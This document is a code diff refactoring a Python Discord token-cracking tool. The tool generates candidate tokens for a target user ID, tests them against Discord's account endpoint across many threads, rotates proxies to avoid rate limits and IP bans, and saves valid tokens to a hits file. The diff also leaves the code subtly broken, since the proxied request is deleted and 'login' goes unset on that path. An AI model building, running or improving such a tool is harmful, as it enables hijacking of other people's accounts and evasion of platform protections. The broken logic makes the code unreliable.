@@ -7,25 +7,15 @@ import requests
 from colorama import Fore, init, Style
 import threading
 
-def print_colored(text, color_code):
+# Constants
+DISCORD_API_URL = 'https://discordapp.com/api/v9/users/@me'
+PROXY_FILE_PATH = 'proxies.txt'
+HIT_FILE_PATH = 'hit.txt'
+
+# Functions
+
+def print_colored(text, color_code=0):
     print(f"\033[{color_code}m{text}\033[0m")
-
-# Check and install required libraries
-try:
-    import requests
-except ImportError:
-    print_colored("Installing requests...", "31")
-    import subprocess
-    subprocess.call(["pip", "install", "requests"])
-    print_colored("Requests installed!", "32")
-
-try:
-    from colorama import Fore, init, Style
-except ImportError:
-    print_colored("Installing colorama...", "31")
-    import subprocess
-    subprocess.call(["pip", "install", "colorama"])
-    print_colored("Colorama installed!", "32")
 
 def clear_console():
     os.system("cls")
@@ -49,28 +39,27 @@ def check_proxy(proxy):
         return False
 
 def check_token_validity(token, proxy):
-    headers = {
-        'Authorization': token,
-    }
+    headers = {'Authorization': token}
     try:
         if proxy:
-            if check_proxy(proxy):
-                login = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers, proxies={'http': proxy, 'https': proxy})
-            else:
-                print(f"{Fore.RED}[-] Proxy not working, skipping token check.{Fore.RESET}")
+            if not check_proxy(proxy):
+                print_colored(f"{Fore.RED}[-] Proxy not working, skipping token check.{Fore.RESET}")
                 return
         else:
-            login = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
+            login = requests.get(DISCORD_API_URL, headers=headers)
 
         if login.status_code == 200:
-            print(f"{Fore.GREEN}[+] VALID {token}{Fore.RESET}")
-            with open('hit.txt', "a+") as f:
-                f.write(f'{token}\n')
+            print_colored(f"{Fore.GREEN}[+] VALID {token}{Fore.RESET}")
+            write_to_file(HIT_FILE_PATH, token)
         else:
-            print(f"{Fore.RED}[-] INVALID {token}{Fore.RESET}")
-    except Exception as e:
-        print(f"{Fore.RED}[-] ERROR OCCURRED {token}")
-        print(f"Error details: {e}")
+            print_colored(f"{Fore.RED}[-] INVALID {token}{Fore.RESET}")
+    except requests.exceptions.RequestException as e:
+        print_colored(f"{Fore.RED}[-] ERROR OCCURRED {token}")
+        print_colored(f"Error details: {e}")
+
+def write_to_file(filename, content):
+    with open(filename, 'a+') as f:
+        f.write(f'{content}\n')
 
 def read_proxies_from_file(file_path):
     with open(file_path, 'r') as file:
@@ -79,12 +68,12 @@ def read_proxies_from_file(file_path):
 
 def print_banner():
     banner = (Fore.MAGENTA + """
-██   ██ ███████ ██████  ███    ███ ██ ███████ 
-██   ██ ██      ██   ██ ████  ████ ██ ██      
-███████ █████   ██████  ██ ████ ██ ██ ███████ 
-██   ██ ██      ██   ██ ██  ██  ██ ██      ██ 
-██   ██ ███████ ██   ██ ██      ██ ██ ███████ 
-""" + Fore.LIGHTCYAN_EX)
+    ██   ██ ███████ ██████  ███    ███ ██ ███████ 
+    ██   ██ ██      ██   ██ ████  ████ ██ ██      
+    ███████ █████   ██████  ██ ████ ██ ██ ███████ 
+    ██   ██ ██      ██   ██ ██  ██  ██ ██      ██ 
+    ██   ██ ███████ ██   ██ ██      ██ ██ ███████ 
+    """ + Fore.LIGHTCYAN_EX)
     print(banner)
 
 def worker(num_tokens, user_id, use_proxies, proxies):
@@ -92,7 +81,7 @@ def worker(num_tokens, user_id, use_proxies, proxies):
         token = get_token(user_id)
         proxy = random.choice(proxies) if use_proxies else None
         check_token_validity(token, proxy)
-
+    time.sleep(2) 
 def main():
     init()
     clear_console()
@@ -122,17 +111,16 @@ def main():
 
     # If using proxies, read proxies from file
     if use_proxies:
-        proxy_file_path = 'proxies.txt'
-        proxies = read_proxies_from_file(proxy_file_path)
+        proxies = read_proxies_from_file(PROXY_FILE_PATH)
 
         # Check if proxies are working
         working_proxies = [proxy for proxy in proxies if check_proxy(proxy)]
 
         if not working_proxies:
-            print(f"{Fore.RED}No working proxies found. Exiting.{Fore.RESET}")
+            print_colored(f"{Fore.RED}No working proxies found. Exiting.{Fore.RESET}")
             return
         else:
-            print(f"{Fore.GREEN}[+] Proxies are working.{Fore.RESET}")
+            print_colored(f"{Fore.GREEN}[+] Proxies are working.{Fore.RESET}")
             proxies = working_proxies
 
     # Input validation for the number of threads
@@ -144,11 +132,11 @@ def main():
                 raise ValueError
             break
         except ValueError:
-            print(f"{Fore.RED}Please enter a valid number greater than 0.{Fore.RESET}")
+            print_colored(f"{Fore.RED}Please enter a valid number greater than 0.{Fore.RESET}")
 
     # Warning for using many threads without proxies
     if num_threads > 10 and not use_proxies:
-        print(f"{Fore.RED}[!] WARNING: Using many threads without proxies may result in rate limiting or IP suspension from Discord.{Fore.RESET}")
+        print_colored(f"{Fore.RED}[!] WARNING: Using many threads without proxies may result in rate limiting or IP suspension from Discord.{Fore.RESET}")
     time.sleep(5)
     clear_console()
 
